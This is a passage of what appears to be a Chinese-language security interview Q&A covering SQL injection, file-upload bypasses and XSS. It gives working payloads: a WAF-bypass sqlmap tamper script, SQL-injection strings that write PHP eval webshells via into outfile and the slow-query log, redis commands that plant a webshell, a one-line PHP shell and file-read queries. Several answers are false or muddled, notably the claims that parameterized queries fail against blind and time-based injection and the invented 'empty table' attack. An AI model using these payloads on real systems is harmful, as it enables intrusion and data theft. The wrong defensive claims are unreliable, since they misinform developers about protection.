href="https://www.freebuf.com/articles/web/229982.html">WAF机制及绕过方法总结：注入篇</a></p><ol start="21"><li>有没有写过sqlmap tamper？</li></ol><p>写过。<br>使用方式：将所写的tamper，如 <code>xx.py</code> 放入 <code>sqlmap\tamper</code> 路径下，然后使用的时候加上参数 <code>--tamper=xx</code> 即可。<br>PRIORITY: 定义tamper的优先级（LOWEST&#x3D;-100, LOWER&#x3D;-50, LOW&#x3D;-10, NORMAL&#x3D;0, HIGH&#x3D;10, HIGHER&#x3D;50, HIGHEST&#x3D;100）<br>dependencies(): 提示用户tamper支持哪些数据库<br>tamper(): 实现的功能全部在该函数里。要实现绕过一般是针对payload修改。<br>注释混淆，绕安全狗。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload = payload.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/*/!%!/*/&quot;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;()&quot;</span>,<span class="string">&quot;(/*/!%!/*/)&quot;</span>)</span><br><span class="line">        payload = re.sub(<span class="string">r&quot;(?i)(INFORMATION_SCHEMA.SCHEMATA)&quot;</span>,<span class="string">r&quot;/*!00000--%20/*%/%0aINFORMATION_SCHEMA.SCHEMATA*/&quot;</span>,payload)</span><br><span class="line">        payload = re.sub(<span class="string">r&quot;(?i)(INFORMATION_SCHEMA.TABLES)&quot;</span>,<span class="string">r&quot;/*!00000--%20/*%/%0aINFORMATION_SCHEMA.TABLES*/&quot;</span>,payload)</span><br><span class="line">        payload = re.sub(<span class="string">r&quot;(?i)(INFORMATION_SCHEMA.COLUMNS)&quot;</span>,<span class="string">r&quot;/*!00000--%20/*%/%0aINFORMATION_SCHEMA.COLUMNS*/&quot;</span>,payload)</span><br><span class="line">        payload = re.sub(<span class="string">r&quot;(?i)(/AS/)&quot;</span>,<span class="string">r&quot;//*!00000--%20/*%/%0aAS*//&quot;</span>,payload)        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p><a href="https://www.secpulse.com/archives/196598.html">参考资料</a></p><ol start="22"><li>为什么参数化查询可以防止SQL注入？</li></ol><p>参数化查询是指在设计与数据库连接并访问数据时，在需要填入数值或数据的地方，使用参数（Parameter）来给值。<br>在使用参数化查询的情况下，数据库服务器不会将参数的内容视为SQL语句的一部分来进行处理，而是在数据库完成SQL语句的编译之后，才套用参数执行。因此就算参数中含有破坏性指令，也不会被数据库执行。<br><a href="https://worktile.com/kb/ask/35126.html">如何从根本上防止 SQL 注入</a></p><ol start="23"><li>盲注是什么？怎么盲注？</li></ol><p>在服务器没有错误回显的时候完成的注入攻击。盲注分为布尔盲注和时间盲注。<br>盲注可以通过手工，burp或sqlmap。<br>手工：首先判断注入点，然后判断当前页面字段数，再判断显示位，之后是猜解当前数据库名长度，用ASCII码猜解当前数据库名，最后猜表名猜字段名猜内容。</p><ol start="24"><li>宽字节注入原理以及根本原因</li></ol><p>原理：见问题4<br>根本原因：设置数据库编码与PHP编码设置为不同的两个编码格式从而导致产生宽字节注入</p><ol start="25"><li>sql如何写shell&#x2F;单引被过滤怎么办？</li></ol><p>sql写shell的前提条件：<br>1 需要知道网站的绝对路径<br>2 secure_file_priv的值为空<br>3 需要足够的权限<br>4 GPC关闭可使用单引号</p><p>sql写shell的方式：<br>(1) 导出函数写shell</p><ul><li>into outfile直接写。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,&quot;&lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;&quot; into outfile &quot;C:/phpstudy/WWW/shell.php&quot;#</span><br></pre></td></tr></table></figure></li><li>shell HEX编码<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,0x3C3F70687020406576616C28245F504F53545B2763275D293B3F3E into outfile &quot;C:/phpStudy/WWW/shell.php&quot;#</span><br></pre></td></tr></table></figure></li></ul><p>(2) 日志写shell<br>① 开启慢查询日志并修改日志为网站路径下的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;; set global slow_query_log=1;set global slow_query_log_file=&#x27;C:/phpstudy/WWW/logshell.php&#x27;;#</span><br></pre></td></tr></table></figure><p>② 执行包含shell的查询语句并使用sleep(11)让语句记录进慢查询日志脚本。连接成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;;select &quot;&lt;?php eval($_POST[log]);?&gt;&quot; from users where sleep(11)#</span><br></pre></td></tr></table></figure><p>(3) 读文件函数写文件<br>① <code>load_file()</code><br>② <code>?id=-1&#39;union select 1,load_file(&#39;C:/phpstudy/WWW/readme.txt&#39;);#</code></p><p>单引号被过滤了怎么办？<br>16进制，ASCII编码，url编码，尝试用双引号或反斜杠代替</p><ol start="26"><li>sql注入点，空表如何利用</li></ol><p>攻击者可以利用空表绕过服务器的过滤。<br>空表攻击的原理：利用空表名作为参数，在查询语句中执行任意SQL语句。如: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `#` WHERE `id` = 1</span><br></pre></td></tr></table></figure><p>具体的防范措施：</p><ul><li>在参数中使用双引号而不是单引号，这样可以避免单引号被转义。</li><li>使用函数来处理参数，例如 trim()、rtrim() 和 ltrim() 等函数，可以帮助去除参数中的空格和其他特殊字符。</li><li>使用正则表达式来验证参数的格式，可以帮助检测和阻止恶意参数。</li></ul><ol start="27"><li>怎样判断是否存在注入</li></ol><p>手工测试，使用工具(sqlmap)，使用安全扫描(Nessus)<br>单引号检测，空格检测，特殊字符检测(; # *等)，逻辑运算符检测(and or等)</p><ol start="28"><li>sql注入无回显怎么办？</li></ol><p>通过dnslog或httplog外带</p><ol start="29"><li>延时注入除了sleep的其它姿势(mysql)</li></ol><p>benchmark()函数</p><ol start="30"><li>DNSlog原理</li></ol><p>DNSlog是DNS的日志，存储在DNS服务器上的域名信息，记录着用户对域名的访问信息，类似日志文件。<br>DNSlog是解析日志，DNS分为三级域名，域名不分大小写，所以利用解析的日志把攻击者需要的值带出，称为数据外带，原理上只要能进行DNS请求的函数都可能存在DNSlog注入。</p><ol start="31"><li>sql注入，写shell的语句，除了into outfile还有什么MySQL的特性可以getshell</li></ol><p>见问题25</p><ol start="32"><li>redis的利用，如何shell，相关命令</li></ol><p>写ssh-keygen公钥登录服务器，利用计划任务反弹shell<br>写shell见问题36</p><ol start="33"><li>sql注入原理，及常用payload（手写-爆表名）</li></ol><p>SQL注入是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p><ol start="34"><li>sql注入空格不能使用如何绕过？</li></ol><p>使用括号绕过，使用 <code>tab %0a /**/</code> 代替</p><ol start="35"><li>sql注入防御，延伸预处理不能预防哪些注入？</li></ol><p>基于盲注的注入（盲注是指攻击者通过向数据库发送一系列的SQL语句来判断数据库中是否存在特定数据。攻击者可将参数值设置为特殊的字符串，例如%或_，以绕过数据库的参数化处理）<br>基于时间延迟的注入（基于时间延迟的注入是指攻击者通过向数据库发送一系列的SQL语句来延迟数据库的响应时间，以判断数据库中是否存在特定数据。在这种情况下，攻击者可以将参数值设置为会导致数据库执行大量计算的语句，以延迟数据库的响应时间。）<br>基于错误信息的注入（基于错误信息的注入是指攻击者通过向数据库发送一系列的SQL语句来获取数据库的错误信息，以判断数据库中是否存在特定数据。在这种情况下，攻击者可以将参数值设置为会导致数据库抛出异常的语句，以获取数据库的错误信息。）</p><ol start="36"><li>攻击redis的方式（手写payload）</li></ol><p>常见攻击redis的方式有：未授权访问、命令注入、缓存溢出、远程代码执行、数据泄露<br>payload示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ip -p port    <span class="comment"># redis远程连接</span></span><br><span class="line">ip:port&gt; info              <span class="comment"># 列出信息</span></span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html </span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\r\n\r\n&lt;?php eval(<span class="variable">$_POST</span>[whoami]);?&gt;\r\n\r\n&quot;</span></span><br><span class="line"><span class="comment"># 用redis写入文件的会自带一些版本信息，如果不换行可能导致无法执行</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><ol start="37"><li>SQL注入写shell（MySQL &amp; mssql &amp; oracle）</li></ol><p>见问题25<br><a href="http://www.kryst4l.cn/2022/09/05/Oracle%E5%92%8Cmssql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%99shell/">Oracle和mssql数据库写shell</a></p><ol start="38"><li>SQL注入后利用</li></ol><p>获取数据库信息，修改数据库数据，删除数据库数据，执行任意操作</p><ol start="39"><li>redis的利用</li></ol><p>见问题32</p><ol start="40"><li>常见的sql注入类型有哪些？并写出sqlmap检测sql注入的命令？sqlmap api怎么使用？</li></ol><p>sql注入类型：联合注入，报错注入，布尔盲注，时间盲注，二次注入，宽字节注入，堆叠注入<br>sqlmap检测sql注入的命令：<br><code>python sqlmap.py -u http://xxx.xxx.xxx.xxx/abc/qwe/?id=1 --dbs --batch</code><br>sqlmap api使用方式：<br>首先在本地启动sqlmap服务器： <code>python sqlmapapi.py -s</code> 将在localhost端口8000运行。(服务端和客户端不在同一台主机上会连接不上)<br>通过该命令开启api服务端： <code>python sqlmapapi.py -s -H &quot;0.0.0.0&quot; -p 8775</code><br>命令成功后，远程客户端可通过指定远程主机IP和端口来连接API服务端</p><p>需要固定 admin token, 修改sqlmap目录下的 <code>/lib/utils/api.py</code> 文件，以下是源代码：<br><code>DataStore.admin_token = encodeHex(os.urandom(16), binary=False)</code></p><p>使用GET请求 <code>new -u &quot;http://192.168.1.1/dvwa/vulnerabilities/sqli/?id=2&amp;submit=Submit&quot;</code><br>创建一个新的扫描任务</p><p>使用POST请求 <code>new -r C:\Users\abc\sql\build1\test.txt</code><br>发送JSON数据到 <code>http://localhost:8000/scan/start</code><br>JSON数据的格式如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://example.com&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;id&quot;</span><span class="punctuation">,</span> <span class="string">&quot;username&quot;</span><span class="punctuation">,</span> <span class="string">&quot;password&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">// url 是目标URL，parameters是需要测试注入的参数。</span></span><br></pre></td></tr></table></figure><p>sqlmap将返回一个JSON数据，其中包含扫描结果，扫描结果的格式如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;running&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;taskid&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;results&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">// status表示扫描状态，taskid是任务id，results是扫描结果</span></span><br><span class="line"><span class="comment">// 扫描完成后，status将变成terminated, results将包含扫描结果</span></span><br></pre></td></tr></table></figure><p>可以通过以下命令获取任务状态(其中 1 是任务id)：<br><code>curl http://localhost:8000/scan/status/1</code><br>可通过以下命令获取所有任务id：<br><code>curl http://localhost:8000/scan/status/ids</code></p><p>基于HTTP协议的接口模式：<br><code>@get(&quot;/task/new&quot;)</code> 新建任务，返回一个随机的taskid<br><code>@get(&quot;/task//delete&quot;)</code> 删除任务，调用时指定taskid<br><code>@get(&quot;/admin/list&quot;)</code> 获取taskid</p><ol start="41"><li>针对sql注入，写出你所知道的bypass waf的可能方式</li></ol><p>见问题20</p><ol start="42"><li>sql注入漏洞如何修复？</li></ol><p>预处理。使用参数化查询。过滤用户输入。使用安全编码实践。配置MySQL临时日志查看SQL语句。</p><ol start="43"><li>数据库预处理怎么突破？</li></ol><p>使用字符串拼接。攻击者可以将用户输入的数据作为字符串拼接到SQL语句中，从而绕过预编译的安全机制。<br>使用函数或存储过程。攻击者可以使用函数或存储过程来执行OS命令，从而绕过预编译的安全机制。<br>错误处理不当。攻击者可以构造恶意的输入来触发SQL语法错误，从而绕过预编译的安全机制。<br><a href="https://xz.aliyun.com/t/10594">SQL注入之Mysql注入姿势及绕过总结</a></p><ol start="44"><li>sql注入如何拿getshell</li></ol><p>见问题37</p><ol start="45"><li>sqlmap怎么跑post请求</li></ol><p>方式一：burp抓包，保存为txt格式文件，放在目录下。<br><code>python sqlmap.py -r &quot;dialog/xx.txt&quot; -p n --dbs</code></p><p>方式二：自动搜索表单的方式<br><code>python sqlmap.py -u &quot;http://example.com/index.php&quot; --forms</code></p><p>方式三：指定一个参数的方法<br><code>python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/index.php --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; --dbs --batch   爆破所有数据库</code></p><ol start="46"><li>sql注入怎么拿到最高权限？</li></ol><p>见问题37</p><ol start="47"><li>怎么利用sql注入来读取文件</li></ol><p>MySQL读文件:<br><code>load_file(&#39;c:/boot.ini&#39;)</code><br>sqlmap的方式：<br><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-2/?id=1&quot; --file-read &quot;D:/test.txt&quot;</code><br>SQL Server 读文件: </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">result</span>(res <span class="type">varchar</span>(<span class="number">8000</span>));</span><br><span class="line">bulk <span class="keyword">insert</span> <span class="keyword">result</span> <span class="keyword">from</span> <span class="string">&#x27;d:/1.txt&#x27;</span>; # BULK <span class="keyword">INSERT</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 开启CLR集成</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">reconfigure;</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;clr_enabled&#x27;</span>,<span class="number">1</span></span><br><span class="line">reconfigure</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> master.dbo.fn_varbintohexstr(<span class="built_in">cast</span>(content <span class="keyword">as</span> <span class="type">varbinary</span>)) <span class="keyword">from</span> sys.assembly_files  # 读取方式</span><br><span class="line"><span class="keyword">create</span> assembly sqb <span class="keyword">from</span> <span class="string">&#x27;d:\net.exe&#x27;</span>;</span><br><span class="line"><span class="keyword">alter</span> assembly sqb <span class="keyword">add</span> file <span class="keyword">from</span> <span class="string">&#x27;d:\1.txt&#x27;</span></span><br><span class="line"><span class="keyword">alter</span> assembly sqb <span class="keyword">add</span> file <span class="keyword">from</span> <span class="string">&#x27;d:\notnet.exe&#x27;</span></span><br></pre></td></tr></table></figure><ol start="48"><li>注入攻击原理是什么？如何找注入点？如何判断注入点？</li></ol><p>注入攻击原理：见问题33<br>如何判断如何找注入点：见问题1，8，27</p><ol start="49"><li>注入分为几类，提交方式是什么？</li></ol><p>见问题2</p><ol start="50"><li>注入攻击一般所支持的类型有哪些？</li></ol><p>见问题49</p><ol start="51"><li>sql注入对服务器文件读写操作需要哪些条件？</li></ol><p>当前用户权限对该文件可读，<br>文件在服务器上，<br>路径完整，<br>文件按大小小于max_allowed_packet，<br>当前数据库用户有FILE权限，file_priv为yes，<br>secure_file_priv的值为空，如果值为某目录，那么就只能对该目录的文件进行操作。</p><ol start="52"><li>分别说出sqlmap -u -r -v -p  –level –risk –tables –columns -T –tamper参数的含义</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-u  URL，指定目标url</span><br><span class="line">-r  REQUESTFILE，从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，</span><br><span class="line">这样就可以跳过设置一些其它参数（比如cookie，post数据等），</span><br><span class="line">请求是HTTPS的时候需要配合这个--force-ssl参数来使用，或者可以在HOST头后门加上443</span><br><span class="line">-v  VERBOSE，信息级别：0-6。</span><br><span class="line">其值具体含义：“0”只显示python错误以及严重的信息；</span><br><span class="line">1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；</span><br><span class="line">“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；</span><br><span class="line">“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。</span><br><span class="line">-p  TESTPARAMETER，可测试的参数</span><br><span class="line">--level  LEVEL，执行测试的等级（1-5，默认为1）</span><br><span class="line">--risk  RISK，执行测试的风险（0-3，默认为1）</span><br><span class="line">--tables  枚举DBMS数据库中的表</span><br><span class="line">--columns  枚举DBMS数据库中表的列名</span><br><span class="line">-T  指定数据库中的表</span><br><span class="line">--tamper  使用给定的脚本篡改注入数据</span><br></pre></td></tr></table></figure><ol start="53"><li>注入漏洞防范方法</li></ol><p>见问题2</p><ol start="54"><li>MySQL数据库的右向偏移</li></ol><p>偏移注入是一种利用MySQL中的字符串截断漏洞来获取敏感信息的攻击方式。<br>攻击者通过在注入语句中插入特殊字符，将字符串截断到指定位置，从而获取该位置的数据。</p><p>偏移注入的攻击原理如下：<br>攻击者首先通过猜测表名和字段名，构造一个SQL注入语句。<br>在注入语句中插入特殊字符，将字符串截断到指定位置。<br>通过查询数据库，获取截断位置的数据。</p><p>偏移注入的攻击方式主要有两种：<br>字符串截断：攻击者通过在注入语句中插入特殊字符，将字符串截断到指定位置。<br>字符编码：攻击者通过在注入语句中插入特殊字符，将字符编码成指定格式，从而获取该格式的数据。</p><p>偏移注入的防范措施主要有以下几点：<br>使用严格模式：MySQL的严格模式可以防止字符串截断漏洞，因此建议使用严格模式。<br>过滤特殊字符：在输入数据中过滤特殊字符，可以防止攻击者利用这些字符进行注入攻击。<br>使用安全的编码方式：使用安全的编码方式，可以防止攻击者利用编码漏洞进行注入攻击。</p><ol start="55"><li>sqlserver利用思路</li></ol><p>(1) 危险存储过程利用<br>(2) COM组件利用<br>(3) SQL server CLR利用<br>(4) SQL Server Agent Job代理执行计划任务利用<br>(5) SQL Server R和Python的利用<br><a href="https://xz.aliyun.com/t/10955">从0开始学习Microsoft SQL Server数据库攻防</a></p><ol start="56"><li>偏移注入</li></ol><p>见问题54</p><ol start="57"><li>说说sql注入手工怎么爆出所有库名字</li></ol><p>爆当前库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata</span></span><br></pre></td></tr></table></figure><p>爆所有库<br><code>show databases;</code><br><code>select * from information_schema.SCHEMATA</code><br><code>id=1&#39; union select 1,schema_name from information_schema.SCHEMATA</code></p><ol start="58"><li>数据库表名test，字段名user，password写出查询语句。</li></ol><p><code>?id=1&#39; union select group_concat(user,password) from test--+</code></p><ol start="59"><li>是否有写过tamper</li></ol><p>见问题21</p><ol start="60"><li>如何彻底杜绝SQL注入？</li></ol><p>见问题2</p><ol start="61"><li>SQL注入，如果注入点在union或order by之后，怎么办？</li></ol><p>使用堆叠注入？</p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><ol><li>文件上传有哪些防护方式？</li></ol><p>(1) 文件上传目录设置为不可执行：最有效。Linux撤销’x’权限，放置在独立存储上作为静态文件。缓存加速，杜绝脚本执行。<br>(2) 判断文件类型：MIME Type、后缀检查等方式。类型检查用白名单。图片用压缩函数或resize函数。<br>(3) 用随机数改写文件名和文件路径：无法得知文件名和路径就难以攻击。类似于shell.php.rar和crossdomain.xml会因重命名而无法攻击。<br>(4) 单独设置文件服务器的域名：浏览器同源策略一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。<br>(5) 限制用户上传文件的类型：指定格式和后缀名，上传后对文件后缀名进行校验，防止攻击者双后缀名绕过。<br>(6) 使用安全的文件上传组件：比如WebUploader, plupload, FineUploader。</p><ol start="2"><li>文件上传白名单利用</li></ol><p>文件包含图片马，文件包含日志，包含SESSION，00截断，文件解析漏洞，.user.ini，.htaccess</p><ol start="3"><li>文件上传点，黑名单限制，如何利用</li></ol><p>上传不常见的PHP扩展名来绕过黑名单（pht, phpt, phtml, php3, php4, php5, php6）<br>文件名过滤时忽略了大小写（pHp,Php,phP）<br>解析漏洞（Apache和IIS解析漏洞）</p><ol start="4"><li>文件上传怎么绕过</li></ol><p>前端客户端过滤绕过：关闭JS脚本<br>基于黑名单的文件名过滤绕过：1. 上传不常见的PHP扩展名来绕过黑名单。 2. 文件名过滤忽略大小写 3. 解析漏洞<br>基于白名单的文件名过滤绕过：1. 空字节注入。 2. 双写扩展名<br>Content-Type过滤：使用burp截断修改content-type<br>文件头过滤：加上图片文件头<br>超短shell： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`$_GET[x]`?&gt;</span><br></pre></td></tr></table></figure><ol start="5"><li>任意文件上传漏洞分几类，说出每类突破方法</li></ol><p>文件类型过滤漏洞：服务器端对文件上传的文件类型进行过滤，但过滤规则不严谨，导致攻击者可以上传恶意文件。例如：修改后缀绕过过滤。<br>文件名过滤漏洞：服务器端对上传的文件名进行过滤，但过滤规则不严谨，导致攻击者可以上传恶意文件。例如：攻击者在恶意脚本的文件名加入特殊字符，绕过过滤。<br>目录穿越漏洞：攻击者可以利用目录穿越漏洞，将恶意文件上传到服务器的敏感目录下。例如：将恶意脚本文件的文件名加入..&#x2F; ,从而将恶意脚本文件上传到上级目录下。<br>文件解析漏洞：服务器端在解析上传的文件时存在漏洞，导致攻击者可以利用该漏洞执行恶意代码。例如，服务器端在解析图片文件时存在漏洞，攻击者可以将恶意脚本文件嵌入到图片文件中，从而执行恶意代码。</p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><ol><li>XSS能用来做什么？</li></ol><p>盗取各类用户账号<br>控制企业数据<br>盗窃企业重要资料<br>非法转账<br>强制发送电子邮件<br>网站挂马控制受害者及其向其它网站发起攻击<br>刷流量，执行弹窗广告</p><ol start="2"><li>XSS的三种类型，防御方法。</li></ol><p>反射型：非持久性，参数型跨站脚本。发出请求时，XSS代码出现在URL中，作为输入提交到服务器，服务器解析后响应，XSS代码随响应内容一同传回浏览器，最后浏览器执行代码。<br>存储型：持久性跨站脚本，可写入数据库或文件等永久保存的介质中。<br>DOM型：文档对象模型（Document Object Model）是接口，允许程序或脚本动态的访问和更新。DOM型XSS是特殊的反射型XSS，也被称为本地跨站，基于DOM文档对象模型的一种漏洞。不需要服务器参与，触发靠浏览器解析。</p><p>防御方法：<br>输入过滤：过滤掉HTML标签，JS代码，特殊字符等。<br>输出编码：对输出到页面的数据进行编码，以使其无法被浏览器执行。如将HTML进行HTML编码，JS进行js编码<br>使用过滤器：使用专业的XSS过滤器来检测和过滤恶意代码。<br>使用安全的编码规范：不将URL中使用用户输入的数据，不将用户输入直接插入到HTML标签中等。<br>执行内容安全策略：CSP限制页面在特定时间内加载的资源来减轻XSS的影响。这些资源可以包括可能损害客户端和服务器的脚本和图像。</p><ol start="3"><li>存储型XSS的原理和危害</li></ol><p>存储型XSS的原理：攻击者将恶意代码注入到服务器端数据库中，当用户访问包含恶意代码的页面时，恶意代码会被执行。<br>危害：可以多次攻击不同用户，窃取用户的账号和密码等信息，钓鱼，控制用户浏览器，传播恶意软件。</p><ol start="4"><li>你怎么理解XSS攻击？</li></ol><p>XSS攻击是一种跨站脚本攻击，是指攻击者将恶意代码注入到 Web 应用程序中，当用户访问该应用程序时，恶意代码会被执行。XSS攻击的危害性较大，可以窃取用户信息、控制用户浏览器、传播恶意软件等。</p><p>XSS攻击分为两种类型：<br>反射型 XSS：攻击者将恶意代码注入到 URL 中，当用户访问该 URL 时，恶意代码会被执行。<br>存储型 XSS：攻击者将恶意代码注入到服务器端数据库中，当用户访问包含恶意代码的页面时，恶意代码会被执行。</p><p>XSS攻击的防范方法主要有：<br>过滤用户输入的数据：对用户输入的数据进行过滤，去除其中的恶意字符和代码。<br>编码输出的数据：对输出到页面的数据进行编码，以使其无法被浏览器执行。<br>使用白名单：只允许特定的字符和代码通过，从而防止恶意代码通过。<br>使用过滤器：使用专业的 XSS 过滤器来检测和过滤恶意代码。</p><ol start="5"><li>如何快速发现XSS位置</li></ol><p>检查用户可控输入：XSS攻击通常需要利用用户可控输入，例如用户名，密码，评论，留言等。因此可以检查这些输入是否经过过滤和编码，如果没有，则可能存在XSS注入。<br>检查HTML输出：XSS攻击可以通过HTML输出来执行。检查输出是否包含敏感字符和代码，如 <code>&lt;script&gt;, &lt;iframe&gt;, &lt;img&gt;</code> 等。<br>使用XSS扫描工具：<a href="https://www.wangan.com/docs/owasp1">OWAZP ZAP</a><br>反射型：搜索栏处。</p><ol start="6"><li>DOM XSS 原理&#x2F;防范</li></ol><p>DOM XSS原理：攻击者在网站的留言板、评论区等地方提交恶意代码；网站将恶意代码输出到页面，但未进行编码；用户访问该页面时，恶意代码会被执行。DOM XSS的危害性较大，因为它可以绕过浏览器的安全机制，直接执行恶意代码。<br>防范：<br>在使用 <code>.innerHTML、.outerHTML、document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent、.setAttribute()</code> 等。<br>如果用 Vue&#x2F;React 技术栈，并且不使用 <code>v-html/dangerouslySetInnerHTML</code> 功能，就在前端 render 阶段避免 <code>innerHTML、outerHTML</code> 的 XSS 隐患。<br>DOM 中的内联事件监听器，如 <code>location、onclick、onerror、onload、onmouseover</code> 等， <code>&lt;a&gt;</code> 标签的 <code>href</code> 属性，JavaScript 的 <code>eval()、setTimeout()、setInterval()</code> 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p><ol start="7"><li>DOM型XSS与反射型XSS区别？</li></ol><p>DOM型XSS攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 